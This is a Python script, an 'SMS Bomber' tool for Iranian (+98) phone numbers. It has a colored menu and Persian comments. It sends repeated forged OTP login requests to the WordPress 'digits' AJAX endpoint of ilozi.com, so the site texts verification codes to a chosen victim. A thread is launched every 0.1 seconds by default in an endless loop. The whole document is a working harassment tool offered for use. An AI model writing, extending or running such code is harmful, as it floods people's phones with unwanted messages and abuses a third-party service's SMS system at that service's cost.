from platform import node, system, release
from os import system as sys_cmd, name
from re import match, sub
from threading import Thread
from time import sleep
import socket

try:
    from requests import post
except ImportError:
    sys_cmd("python3 -m pip install requests")
    from requests import post

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'   # <-- اضافه شد
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'

Node, System, Release = node(), system(), release()

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+98", phone)
    return False

# ------------------------------
# Ilozi SMS API
# ------------------------------
def ilozi(phone):
    url = "https://ilozi.com/wp-admin/admin-ajax.php"
    payload = {
        "login_digt_countrycode": "+98",
        "digits_phone": phone.replace("+98",""),  # شماره بدون +98
        "action_type": "phone",
        "sms_otp": "",
        "otp_step_1": "1",
        "digits_otp_field": "1",
        "digits": "1",
        "instance_id": "6fb17492e0d343df4e533a9deb8ba6b9",  # ممکنه ثابت نباشه
        "action": "digits_forms_ajax",
        "type": "login",
        "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
        "digits_form": "3780032f76",
        "show_force_title": "1",
        "otp_resend": "true",
        "container": "digits_protected",
        "sub_action": "sms_otp"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        response = post(url, data=payload, headers=headers, timeout=5)
        if response.status_code == 200 and response.json().get('success') is True:
            print(f'{g}(Ilozi) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Ilozi) Failed or No Response{a}')
            return False
    except Exception as e:
        print(f'{r}[!] Ilozi Exception: {e}{a}')
        return False

# Wrapper to safely run service
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response")

# SMS Bomber loop
def Vip(phone, Time):
    services = [ilozi]
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} service(s)")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Stopped!")
        sys_cmd('clear' if name == 'posix' else 'cls')

# Menu
def main_menu():
    sys_cmd('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════╗
{b}║        ⟬ Bomber Plus Tool ⟭       ║
{p}╚════════════════════════════════════╝
System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════
{w}Choose an Option:
    {g}[1] {y}SMS Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-1): {a}")

# Main loop
def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
